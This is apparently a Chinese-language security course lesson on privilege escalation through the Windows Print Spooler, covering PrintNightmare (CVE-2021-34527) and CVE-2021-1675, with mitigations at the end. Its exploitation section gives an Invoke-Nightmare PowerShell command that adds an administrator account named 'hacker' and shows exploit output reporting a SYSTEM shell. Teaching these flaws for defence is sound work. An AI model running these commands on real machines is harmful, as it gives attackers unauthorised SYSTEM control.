# 课时09 Windows Print Spooler漏洞提权

## 一、课程目标

本节课重点讲解Windows Print Spooler服务中的严重漏洞及其提权利用方法。Print Spooler是Windows系统中负责打印任务管理的服务，由于其历史悠久且权限极高（SYSTEM），近年来频频爆出严重漏洞（如PrintNightmare）。通过本课的学习，你将能够：

1. 理解Windows打印服务架构及其攻击面
2. 掌握PrintNightmare等经典漏洞的原理
3. 学习如何利用Print Spooler漏洞进行本地提权
4. 了解相关的防御和缓解措施

## 二、名词解释表

| 名词 | 解释 |
|------|------|
| Print Spooler | 打印后台处理程序服务，默认以SYSTEM权限运行 |
| RPC | Remote Procedure Call，远程过程调用，用于服务间通信 |
| Point and Print | Windows的一项功能，允许用户轻松连接到远程打印机 |
| Driver | 驱动程序，打印机驱动通常包含DLL文件 |
| RpcAddPrinterDriverEx | 一个关键的RPC函数，用于安装打印机驱动 |
| PrintNightmare | 指代CVE-2021-34527等一系列打印服务高危漏洞 |

## 三、技术原理

### 3.1 打印服务架构

Print Spooler服务（`spoolsv.exe`）在所有Windows系统上默认启用，并且以最高权限**SYSTEM**运行。它通过RPC接口暴露了多种功能，允许用户添加打印机、安装驱动等。

### 3.2 漏洞成因 (PrintNightmare)

PrintNightmare (CVE-2021-34527) 的核心在于`RpcAddPrinterDriverEx`函数的逻辑缺陷。

1.  **权限检查绕过**：理论上安装驱动需要管理员权限，但漏洞允许经过身份验证的普通用户利用某些标志绕过检查。
2.  **任意文件加载**：攻击者可以指定一个恶意的DLL作为打印机驱动。
3.  **SYSTEM执行**：由于Spooler服务以SYSTEM运行，当它加载并执行这个恶意DLL时，攻击者就获得了SYSTEM权限。

### 3.3 攻击流程

1.  **连接RPC接口**：攻击者通过MS-RPRN或MS-PAR协议连接到Spooler服务。
2.  **添加恶意驱动**：调用`RpcAddPrinterDriverEx`，指向攻击者控制的恶意DLL（本地或UNC路径）。
3.  **触发执行**：Spooler服务加载该DLL，执行其中的Payload（如添加新管理员用户）。

## 四、常见漏洞案例

### 4.1 CVE-2021-1675

*   **描述**：早期的Print Spooler提权漏洞。
*   **区别**：最初被认为是LPE（本地提权），后来发现变种可导致RCE，与PrintNightmare密切相关。

### 4.2 CVE-2021-34527 (PrintNightmare)

*   **描述**：最为著名的打印服务漏洞，既可远程代码执行（RCE），也可本地提权（LPE）。
*   **影响**：几乎所有版本的Windows。
*   **利用**：公开的Exploit非常多，包括Python、C++、PowerShell版本。

## 五、漏洞利用实战

### 5.1 环境确认

首先检查目标机器是否开启了Print Spooler服务。

```powershell
# 检查服务状态
Get-Service Spooler
# 或者
sc query Spooler
```
如果服务状态为 `RUNNING`，则可能存在漏洞。

### 5.2 使用PowerShell脚本提权

常用的利用脚本是 `Invoke-Nightmare.ps1`。

```powershell
# 导入模块
Import-Module .\Invoke-Nightmare.ps1

# 执行提权，添加一个管理员用户
# 用法：Invoke-Nightmare -NewUser <用户名> -NewPassword <密码> -DriverName <驱动名>
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pass123!" -DriverName "PrintMe"
```

执行成功后，`hacker` 用户将被添加到本地管理员组。

### 5.3 使用C#利用工具

也可以使用编译好的EXE程序，例如 `PrintNightmareLPE.exe`。

```cmd
> PrintNightmareLPE.exe
[+] Exploiting Print Spooler...
[+] Malicious DLL loaded by spoolsv.exe
[+] SYSTEM shell spawned!
```

## 六、安全建议

1.  **禁用服务**：如果服务器不需要打印功能（通常域控制器不需要），直接禁用Print Spooler服务是彻底的解决方法。
    ```cmd
    net stop Spooler
    sc config Spooler start= disabled
    ```
2.  **安装补丁**：微软已发布相关累积更新，务必安装最新补丁。
3.  **组策略限制**：配置"Point and Print Restrictions"组策略，禁止非管理员安装打印驱动。
